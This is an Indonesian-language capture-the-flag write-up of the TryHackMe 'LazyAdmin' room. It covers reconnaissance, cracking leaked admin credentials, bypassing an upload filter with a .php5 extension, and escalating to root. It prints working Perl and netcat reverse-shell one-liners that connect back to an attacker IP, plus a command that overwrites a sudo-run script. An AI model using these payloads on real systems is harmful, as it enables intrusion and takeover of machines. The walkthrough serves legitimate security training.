---
title: "Tryhackme - LazyAdmin WriteUps"
date: 2022-12-16 13:00:00 +07:00
categories: [WriteUps]
tags: [ctf, Tryhackme, pentest, writeups]
image: 
---

# Tryhackme - LazyAdmin WriteUps

Menemukan Port terbuka dengan Nmap, Nmap menemukan beberapa layanan umum yang berjalan pada port standar mereka: 22 (SSH) dan 80 (HTTP).
![image](https://media.discordapp.net/attachments/740245586095112242/1057183440065278022/image.png)

Selanjutnya kita mencoba scan directory tersembunyi dengan Ffuf. Disini kita menemukan information sensitive yang ada pada directory listing di ```/content/inc```:
![image](https://media.discordapp.net/attachments/740245586095112242/1057183750422798356/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057183880525910046/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057183998167765012/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057184167206596670/image.png)

Setelah kita membuka file .sql nya, Disini kita mendapatkan admin dan password yang memungkinkan informasi ini mengarah pada login panel. Dari fuzzing directory tadi kita mendapatkan directory pada ```/content/as/ directory``` tersebut mengarah pada login panel. Kita coba login dengan admin dan password yang didapat dari databases tadi. Untuk admin password setelah kita crack:
```
manager:Password123
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057184472358985748/image.png)

Kita disini mencoba mencari file uploader, ternyata file uploader ini berada di menu Media Center. Tetapi disini tidak bisa langsung upload ```file.php``` karena server tidak menerima file berextesion php maka itu kita bypass ```file.php``` nya menjadi ```file.php5```
![image](https://media.discordapp.net/attachments/740245586095112242/1057184797044256809/image.png)

Setelah berhasil ke upload kita mencari dimana letak ```file.php``` tersebut, letak file.php di directory ```/content/attachment```. Disini kita bisa menggunakan backdoor ```file.php``` ini untuk backconnect dengan kita.
![image](https://media.discordapp.net/attachments/740245586095112242/1057185105778589726/image.png)

Kita mencoba backconnect an server victim ke server attacker dengan ```revshell``` generator. Payloadnya:
```
perl -e 'use Socket;$i="10.8.46.188";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057185479180689438/image.png)

Selanjutnya kita biasa untuk melihat sudoers dengan menggunakan ```sudo -l``` disini apakah ada local privileges atau tidak. Dan ternyata disini ada package perl dan ```/home/itguy/backup.pl``` yang bisa masuk ke root access secara langsung. 
![image](https://media.discordapp.net/attachments/740245586095112242/1057185986028785705/image.png)

Mari kita lihat dengan membaca isi file dari ```/home/itguy/backup.pl```. disini file ```backup.pl``` memanggil bash secara langsung dengan pemanggilan pada ```/etc/copy.sh```.
![image](https://media.discordapp.net/attachments/740245586095112242/1057186186604580976/image.png)

File ```copy.sh``` ini juga berisi reverse shell yang dapat kita backconnect an dengan web victim. kita mencoba dengan payload ini untuk menaikan user biasa ke root access dengan cara backconnect dengan ```nc -lvnp```. 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPME 7331 >/tmp/f
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057188478527488000/image.png)

Kita mencoba mengganti isi file copy.sh dengan cara: 
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.46.188 7331 >/tmp/f" > /etc/copy.sh
```
setelah kita ubah dengan alamat IP kita dapat langsung masuk pada root access. Kita mencoba menjalankan file ```/home/itguy/backup.pl``` dengan menambahkan sudo dan menjalankan perl. 
![image](https://media.discordapp.net/attachments/740245586095112242/1057188578553233428/image.png)

Kembali ke netcat kita, dan disini kita telah mendapatkan root access.
![image](https://media.discordapp.net/attachments/740245586095112242/1057188665157230673/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057188746669330522/image.png)
